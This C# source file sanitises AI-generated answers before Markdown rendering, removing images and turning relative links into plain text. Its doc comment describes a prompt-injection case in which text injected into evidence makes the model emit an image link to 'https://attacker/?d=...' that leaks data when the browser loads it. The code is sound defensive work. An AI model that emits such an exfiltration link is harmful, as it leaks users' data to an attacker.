using System.Text.RegularExpressions;

namespace GovUK.Dfe.AI.Agents.Quality;

/// <summary>
/// Makes answers safe to show as Markdown:
/// <list type="bullet">
/// <item>Images are removed, keeping their alt text. A browser loads an image without a click, so text injected into
/// evidence could make the model write <c>![](https://attacker/?d=...)</c> and leak data. Links need a click, so they stay.</item>
/// <item>A link without a full web address, e.g. <c>[Evidence 1](evidence/1)</c>, would point at the app itself and give a
/// 404, so it's turned back into text. Links to full <c>https://</c> addresses, e.g. web search sources, are kept.</item>
/// </list>
/// </summary>
internal static partial class AnswerLinks
{
    public static string? Clean(string? answer)
    {
        if (string.IsNullOrEmpty(answer))
        {
            return answer;
        }

        var cleaned = MarkdownImage().Replace(answer, static image => image.Groups["alt"].Value);
        cleaned = HtmlImage().Replace(cleaned, string.Empty);
        return MarkdownLink().Replace(cleaned, static link =>
        {
            var (text, target) = (link.Groups["text"].Value, link.Groups["target"].Value.Trim());
            if (IsFullAddress(target))
            {
                return link.Value;
            }

            // A citation keeps its brackets, so it still reads, and checks, as [Evidence n].
            return CitationText().IsMatch(text) ? $"[{text}]" : text;
        });
    }

    private static bool IsFullAddress(string target)
        => Uri.TryCreate(target.Split(' ', 2)[0], UriKind.Absolute, out var uri)
           && (uri.Scheme == Uri.UriSchemeHttps || uri.Scheme == Uri.UriSchemeHttp || uri.Scheme == Uri.UriSchemeMailto);

    [GeneratedRegex(@"!\[(?<alt>[^\[\]]*)\]\((?<target>[^()]*)\)", RegexOptions.CultureInvariant, matchTimeoutMilliseconds: 1000)]
    private static partial Regex MarkdownImage();

    [GeneratedRegex(@"<img\b[^>]*>", RegexOptions.CultureInvariant | RegexOptions.IgnoreCase, matchTimeoutMilliseconds: 1000)]
    private static partial Regex HtmlImage();

    [GeneratedRegex(@"(?<!!)\[(?<text>[^\[\]]+)\]\((?<target>[^()\s]*(?:\s+""[^""]*"")?)\)", RegexOptions.CultureInvariant, matchTimeoutMilliseconds: 1000)]
    private static partial Regex MarkdownLink();

    [GeneratedRegex(@"^Evidence \d{1,6}$", RegexOptions.CultureInvariant)]
    private static partial Regex CitationText();
}
